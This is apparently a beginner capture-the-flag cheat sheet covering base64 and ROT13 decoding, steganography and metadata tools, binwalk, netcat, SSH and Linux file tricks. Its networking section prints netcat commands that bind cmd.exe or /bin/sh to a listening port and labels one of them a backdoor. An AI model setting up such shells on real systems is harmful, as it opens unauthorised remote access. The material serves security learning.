
---

## 1. Encoding & Decoding
### Base64
Encode or decode data and print to standard output.
```bash
# Create encoded file
echo VEhNe2p1NTdfZDNjMGQzXzdoM19iNDUzfQ== > file.txt

# Decode file
base64 -d file.txt

ROT Cipher & Translation

Use tr to translate or delete characters (e.g., ROT13).
Bash

cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'

Esoteric Languages

    Brainfuck: Minimalistic language with 8 commands. dCode Brainfuck Decoder.

2. File Analysis & Forensic Tools
Binwalk

Used for searching binary images for embedded files and executable code (Firmware analysis).
Bash

binwalk file.bin
binwalk -e file.bin # Extract files

Steganography

    Steghide: Hides data in BMP, JPEG, WAV, and AU files.
    Bash

steghide extract -sf Extinction.jpg

Stegsolve: Java tool for image analysis.
Bash

    java -jar stegsolve.jar

Metadata & Strings

    Exiftool: Shows EXIF information (GPS, metadata) in JPEG files.
    Bash

exif Extinction.jpg

Strings: Print printable characters in files.
Bash

    strings file.hello | grep -i thm{

3. Networking Tools
Netcat (nc)

The "Swiss Army Knife" of networking. Useful for port scanning, backdoors, and file transfers.

Netcat as a Backdoor (Windows):
Bash

nc -L -p 4444 -d -e cmd.exe

Netcat as a Management Tool (Linux):
Bash

# Server side
nc -l -p 1234 -e /bin/sh

# Client side
nc 192.168.1.2 1234

OpenSSL & SSH

    OpenSSL Client: openssl s_client -connect localhost:port

    SSH with Private Key: ssh -i sshkey.private user@localhost -p 2220

    Telnet: telnet localhost port

4. Linux Command Line Tricks
File Handling

    Files named -: To open a file literally named "-", use the full path to avoid confusing it with STDIN.
    Bash

    cat ./-

    Decompression:

        .bz2: bunzip2 file.bz2

        .gz: gunzip file.gz

Data Manipulation

    Unique Lines: Report or omit repeated lines.
    Bash

cat data.txt | sort | uniq -u

Disk Usage: Find files by byte size.
Bash

du -b -a | grep 1033